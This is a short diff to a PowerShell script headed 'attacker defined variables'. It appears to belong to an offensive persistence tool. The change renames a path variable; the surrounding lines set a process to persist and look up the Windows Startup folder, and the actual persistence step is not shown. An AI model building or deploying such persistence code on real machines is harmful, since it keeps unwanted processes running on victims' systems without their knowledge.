@@ -1,9 +1,9 @@
 #attacker defined variables
-$pathofscript = "relative path of the script"
+$dirofscript = "relative path to dir of the script"
 $persist = "process to persist"
 
 #change directory to the one containing powersistnace
-cd $pathofscript
+cd $dirofscript
 
 #find startup folder
 $path = [Environment]::GetFolderPath("Startup")
